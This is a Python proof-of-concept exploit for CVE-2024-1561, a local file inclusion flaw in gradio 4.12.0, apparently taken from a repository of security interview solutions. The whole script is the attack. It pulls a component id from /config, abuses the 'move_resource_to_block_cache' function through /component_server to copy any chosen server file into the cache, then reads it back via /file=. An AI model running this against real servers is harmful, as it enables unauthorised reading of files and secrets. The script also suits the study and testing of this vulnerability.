
# gradio 4.12.0 LFI Demo - CVE-2024-1561
# src: https://github.com/christopherwoodall/huntr-interview-questions/blob/main/solutions/gradio-cve-2024-1561-medium/exploit.py

import json

import http.client
import urllib.parse

from typing import Dict, Any


def post_request(
    conn: http.client.HTTPConnection,
    endpoint: str,
    payload: str,
    headers: Dict[str, str],
) -> Dict[str, Any]:
    conn.request("POST", endpoint, body=payload, headers=headers)
    response = conn.getresponse()
    response_data = response.read().decode()
    return {"status": response.status, "data": response_data}


def get_request(conn: http.client.HTTPConnection, payload: str) -> Dict[str, Any]:
    conn.request("GET", payload)
    response = conn.getresponse()
    response_data = response.read().decode()
    return {"status": response.status, "data": response_data}


def lookup(server: str, port: int, target_file: str) -> str:
  """
  Lookup the target file on the server.

  Args:
      server (str): The server address.
      port (int): The server port.
      target_file (str): The target file to look up.
  """
  response = {}

  component_id = ""
  cached_file_path = ""

  conn = http.client.HTTPConnection(server, port)

  try:
    # Setup - get app config
    payload = f"/config"
    response = get_request(conn, payload)

    # Extract a valid `component_id`
    component_id = json.loads(response["data"])["components"][0]["id"]

    # SETUP - Move resource to cache
    api_endpoint = "/component_server"
    payload = json.dumps(
        {
            "component_id": component_id,
            "data": target_file,
            "fn_name": "move_resource_to_block_cache",
            "session_hash": "aaaaaaaaaaa",
        }
    )
    headers = {"Content-Type": "application/json"}

    response = post_request(conn, api_endpoint, payload, headers)

    # Extract the cache path
    cached_file_path = response["data"].strip('"')

    # PAYLOAD - Move resource to block cache and read secrets
    payload = f"/file={cached_file_path}"
    response = get_request(conn, payload)

  finally:
    conn.close()

  return json.dumps(response["data"])
